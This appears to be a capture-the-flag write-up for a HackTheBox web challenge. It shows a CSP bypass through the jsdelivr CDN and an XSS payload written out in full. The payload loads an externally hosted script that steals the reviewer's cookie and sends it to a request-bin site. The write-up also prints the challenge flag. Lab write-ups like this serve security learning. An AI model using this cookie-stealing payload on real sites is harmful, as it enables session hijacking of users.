challenge link : https://app.hackthebox.com/challenges/Cursed%2520Secret%2520Party

![image](https://github.com/user-attachments/assets/c67b2a1a-5017-4c13-8b68-40409bd9fc1b)

Starting of the challenge we see a hallowen party register after putting the needed informations he says that 
our request will be reviewed put in mind that on every ctf when it says that we have a chance to use xss as attack 

![image](https://github.com/user-attachments/assets/4091c595-65bb-45b5-83a6-9ff697b5edf7)

Maybe for the reason to retrieve cookie values because on our challenge when we download the files of the challenge it says 

![image](https://github.com/user-attachments/assets/b4e6ffd2-5f95-4fb3-bb1e-146eae6e668f)

That our flag is on the token which  we're going to intercept through cookie .

Now we should search for the misconfiguration or a possiblity of an attack i've started intercepting the traffic with burp 


![image](https://github.com/user-attachments/assets/a427e407-0380-412e-8b68-b220b20b2e40)

within the response we can see it uses a different variety of csp after reviewing that with the csp eveluator 

site : https://csp-evaluator.withgoogle.com/

![image](https://github.com/user-attachments/assets/c656693f-c37b-454e-b3d6-207ea281926a)


and here we can see that we have a security problem on our security-src which appeared to be an open source 

![image](https://github.com/user-attachments/assets/4b144f98-165e-43d8-ac38-9dc5912f1c01)

as you can see that we can request throught github i've created a new file on github and tested the response 

![image](https://github.com/user-attachments/assets/f44352db-787f-45c4-893b-897e570f4f24)

and now 

![image](https://github.com/user-attachments/assets/48408d09-63b0-433c-a805-2b929e8b0c3f)

It works we got the response for the script so as we know that when get some sources we use 

<script src="your_source"></script>

and i have used some website to intercept the requests sent by the application 

site : https://webhook.site  or https://pipedream.com/requestbin
after adding the request in our halloween name 
payload : <script src="https://cdn.jsdelivr.net/gh/AhmedBennaser1/CTF/hackthebox/htb_ctf/cursed_secret_party/xss_cookie.js"></script>

we got a response 

![image](https://github.com/user-attachments/assets/29dac224-065b-4d17-90b5-ef8eff0f24a8)


and as we know that it is a jwt token we copy and paste on an  Online JWT Decoder
site : https://fusionauth.io/dev-tools/jwt-decoder 
and like that we got the flag 

![image](https://github.com/user-attachments/assets/0e218721-cf57-472f-8964-5965c61630a5)


Flag : HTB{d0n't_4ll0w_cdn_1n_c5p!!}
